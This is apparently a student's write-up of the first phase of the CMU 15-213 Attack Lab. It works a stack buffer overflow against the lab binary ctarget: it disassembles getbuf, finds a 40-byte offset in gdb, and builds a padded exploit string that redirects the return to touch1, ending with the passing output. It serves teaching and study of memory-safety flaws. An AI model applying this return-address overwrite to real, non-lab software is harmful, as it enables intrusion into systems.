# Level 0 

For level 0, we just exploit string will redirect the program to execute an existing procedure
In particular, the task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes
its return statement, rather than returning to `test`

Type these command and to get assembly code `CTARGET` and address of `touch1`

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ objdump -d ctarget > ctarget.d
danghai@ubuntu:~/Security_Exploit/attack_lab$ grep -i "touch1" ctarget.d
00000000004017c0 <touch1>:
```

Assembly code of `test`: 

```asm
   0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq  
```

The address `0x401976` will store in stack as a return address when it calls function `getbuf`

Look at the assembly code `getbuf`:

```asm
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
```

Create the string to fill full buffer

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ perl -e 'print "61 "x28' > hex_level0
danghai@ubuntu:~/Security_Exploit/attack_lab$ ./hex2raw <hex_level0> raw_level0
```

Using gdb and put breakpoint at `*getbuf+12`

```
(gdb) break *getbuf+12
(gdb) run -q < raw_level0
```

Display the stack memory: 

```asm
(gdb) x/20x $esp
0x5561dc78:	0x61616161	0x61616161	0x61616161	0x61616161
0x5561dc88:	0x61616161	0x61616161	0x61616161	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
```

Look at return address `0x401976` at address `0x5561DCA0`. So the buffer string is : `0x5561DCA0` - `0x5561dc78` = 40 bytes. We need to 
overwrite address `0x401976` by address of `touch1: 0x4017c0`  

Create the exploit string ( 40 bytes + address touch1) 

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ perl -e 'print "61 "x40,"c0 17 40 00"' > hex_level0
danghai@ubuntu:~/Security_Exploit/attack_lab$ ./hex2raw <hex_level0> raw_level0
danghai@ubuntu:~/Security_Exploit/attack_lab$ ./ctarget -q < raw_level0
```

!OUTPUT: PASS 

```
danghai@ubuntu:~/Security_Exploit/attack_lab$ ./ctarget -q < raw_level0
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 C0 17 40 00 
```


